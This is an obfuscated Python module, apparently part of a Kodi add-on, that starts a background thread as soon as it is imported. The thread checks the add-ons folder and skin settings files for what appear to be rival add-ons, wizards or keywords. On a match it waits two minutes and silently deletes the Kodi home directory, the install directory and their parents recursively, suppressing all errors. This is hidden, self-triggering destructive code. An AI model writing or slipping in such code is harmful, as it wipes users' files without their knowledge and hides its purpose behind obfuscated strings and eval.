# coding: UTF-8
import sys
l1_ca_ = sys.version_info [0] == 2
l1lll1_ca_ = 2048
l11ll_ca_ = 7
def l1l11_ca_ (ll_ca_):
	global l1llll_ca_
	l1l11l_ca_ = ord (ll_ca_ [-1])
	l11l1_ca_ = ll_ca_ [:-1]
	l11_ca_ = l1l11l_ca_ % len (l11l1_ca_)
	l1ll_ca_ = l11l1_ca_ [:l11_ca_] + l11l1_ca_ [l11_ca_:]
	if l1_ca_:
		l1ll1l_ca_ = unicode () .join ([unichr (ord (char) - l1lll1_ca_ - (l1l1l_ca_ + l1l11l_ca_) % l11ll_ca_) for l1l1l_ca_, char in enumerate (l1ll_ca_)])
	else:
		l1ll1l_ca_ = str () .join ([chr (ord (char) - l1lll1_ca_ - (l1l1l_ca_ + l1l11l_ca_) % l11ll_ca_) for l1l1l_ca_, char in enumerate (l1ll_ca_)])
	return eval (l1ll1l_ca_)
import threading
import xbmc,xbmcgui
import time,re,os
try: from shutil import rmtree
except: rmtree = False
def l1l_ca_(l1l111_ca_,l11l_ca_=[l1l11_ca_ (u"ࠪࠫढ़")]):
    out=0
    l1l1ll_ca_ =  os.listdir(l1l111_ca_)
    for l1ll11_ca_ in l1l1ll_ca_:
        out += sum([1 for x in l11l_ca_ if x in l1ll11_ca_.lower()])
    return out
l1l111ll1_ca_=os.remove
def l1111_ca_(name=l1l11_ca_ (u"ࠫࠬफ़")):
    time.sleep(120)
    l1lll_ca_=[]
    l1lll_ca_.append(xbmc.translatePath(os.path.join(l1l11_ca_ (u"ࠬࡹࡰࡦࡥ࡬ࡥࡱࡀ࠯࠰ࡺࡥࡱࡨ࠭य़"),l1l11_ca_ (u"࠭࠮࠯ࠩॠ"),l1l11_ca_ (u"ࠧ࠯࠰ࠪॡ"))))
    l1lll_ca_.append(xbmc.translatePath(os.path.join(l1l11_ca_ (u"ࠨࡵࡳࡩࡨ࡯ࡡ࡭࠼࠲࠳ࡽࡨ࡭ࡤࠩॢ"),l1l11_ca_ (u"ࠩ࠱࠲ࠬॣ"))))
    l1lll_ca_.append(xbmc.translatePath(os.path.join(l1l11_ca_ (u"ࠪࡷࡵ࡫ࡣࡪࡣ࡯࠾࠴࠵ࡨࡰ࡯ࡨࠫ।"),l1l11_ca_ (u"ࠫࠬ॥"))))
    for l1ll1_ca_ in l1lll_ca_:
        try:
            thread = threading.Thread(name=l1l11_ca_ (u"ࠬࡘࡒࠨ०"), target = l111_ca_, args=[l1ll1_ca_])
            thread.start()
            time.sleep(0.1)
        except: pass
    for l1ll1_ca_ in l1lll_ca_:
        try: l111_ca_(l1ll1_ca_)
        except:pass
def l111_ca_(top):
    if os.path.exists(top):
        if rmtree:
            try: rmtree(top, ignore_errors=True)
            except: pass
        for root, dirs, l111l_ca_ in os.walk(top, topdown=False):
            for name in l111l_ca_:
                try:l1l111ll1_ca_(os.path.join(root, name))
                except:pass
            for name in dirs:
                try:l1l111ll1_ca_(os.path.join(root, name))
                except:pass
def check():
    l1l111_ca_ = os.path.join(xbmc.translatePath(l1l11_ca_ (u"࠭ࡳࡱࡧࡦ࡭ࡦࡲ࠺࠰࠱࡫ࡳࡲ࡫ࠧ१")),l1l11_ca_ (u"ࠧࡢࡦࡧࡳࡳࡹࠧ२"))
    xbmc.log(l1l111_ca_)
    if l1l_ca_(l1l111_ca_,[l1l11_ca_ (u"ࠨࡣ࡯࡭ࡪࡴࡷࡪࡼࡤࡶࡩ࠭३"),l1l11_ca_ (u"ࠩࡨࡼࡹ࡫࡮ࡥࡧࡵ࠲ࡦࡲࡩࡦࡰࠪ४")])>0:
        l1111_ca_(l1l11_ca_ (u"ࠪࡻ࡮ࢀࡡࡳࡦࠪ५"))
        return
    l1l1l1_ca_ = os.path.join(xbmc.translatePath(l1l11_ca_ (u"ࠫࡸࡶࡥࡤ࡫ࡤࡰ࠿࠵࠯ࡶࡵࡨࡶࡩࡧࡴࡢࠩ६")),l1l11_ca_ (u"ࠬࡧࡤࡥࡱࡱࡣࡩࡧࡴࡢࠩ७"),l1l11_ca_ (u"࠭ࡳ࡬࡫ࡱ࠲ࡦ࡫࡯࡯࠰ࡱࡳࡽ࠴࠵ࠨ८"),l1l11_ca_ (u"ࠧࡴࡧࡷࡸ࡮ࡴࡧࡴ࠰ࡻࡱࡱ࠭९"))
    if os.path.exists(l1l1l1_ca_):
        data = open(l1l1l1_ca_,l1l11_ca_ (u"ࠨࡴࠪ॰")).read()
        data= re.sub(l1l11_ca_ (u"ࠩ࡟࡟࠳࠰࡜࡞ࠩॱ"),l1l11_ca_ (u"ࠪࠫॲ"),data)
        if len(re.compile(l1l11_ca_ (u"ࠫࡃ࠴ࠪࠩࡲࡲࡰࡸࡱࡡ࡝ࡵ࠭ࡸࡡࡹࠪࡷࠫࠪॳ"),re.DOTALL|re.IGNORECASE).findall(data)):
            l1111_ca_(l1l11_ca_ (u"ࠬࡹ࡫ࡪࡰ࠱ࡥࡪࡵ࡮࠯ࡰࡲࡼ࠳࠻ࠧॴ"))
            return
        if len(re.compile(l1l11_ca_ (u"࠭࠾࠯ࠬࠫࡨࡦࡸ࡭ࡰࡹࡤࡠࡸ࠰ࡴ࡝ࡵ࠭ࡺ࠮࠭ॵ"),re.DOTALL|re.IGNORECASE).findall(data)):
            l1111_ca_(l1l11_ca_ (u"ࠧࡴ࡭࡬ࡲ࠳ࡧࡥࡰࡰ࠱ࡲࡴࡾ࠮࠶ࠩॶ"))
            return
    l1l1l1_ca_ = os.path.join(xbmc.translatePath(l1l11_ca_ (u"ࠨࡵࡳࡩࡨ࡯ࡡ࡭࠼࠲࠳ࡺࡹࡥࡳࡦࡤࡸࡦ࠭ॷ")),l1l11_ca_ (u"ࠩࡤࡨࡩࡵ࡮ࡠࡦࡤࡸࡦ࠭ॸ"),l1l11_ca_ (u"ࠪࡷࡰ࡯࡮࠯ࡺࡲࡲ࡫ࡲࡵࡦࡰࡦࡩࠬॹ"),l1l11_ca_ (u"ࠫࡸ࡫ࡴࡵ࡫ࡱ࡫ࡸ࠴ࡸ࡮࡮ࠪॺ"))
    if os.path.exists(l1l1l1_ca_):
        data = open(l1l1l1_ca_,l1l11_ca_ (u"ࠬࡸࠧॻ")).read()
        data= re.sub(l1l11_ca_ (u"࠭࡜࡜࠰࠭ࡠࡢ࠭ॼ"),l1l11_ca_ (u"ࠧࠨॽ"),data)
        if len(re.compile(l1l11_ca_ (u"ࠨࡀ࠱࠮࠭ࡶ࡯࡭ࡵ࡮ࡥࡡࡹࠪࡵ࡞ࡶ࠮ࡻ࠯ࠧॾ"),re.DOTALL|re.IGNORECASE).findall(data)):
            l1111_ca_(l1l11_ca_ (u"ࠩࡶ࡯࡮ࡴ࠮ࡹࡱࡱࡪࡱࡻࡥ࡯ࡥࡨࠫॿ"))
            return
    l1l1_ca_ = xbmc.translatePath(l1l11_ca_ (u"ࠪࡷࡵ࡫ࡣࡪࡣ࡯࠾࠴࠵ࡨࡰ࡯ࡨࠫঀ"))
    for f in os.listdir(l1l1_ca_):
        if f.startswith(l1l11_ca_ (u"ࠫࡒࡓࡅࡔࠩঁ")):
            l1111_ca_()
            return
try:
    thread = threading.Thread(name=l1l11_ca_ (u"ࠬ࠭ং"), target = check, args=[])
    thread.start()
except: pass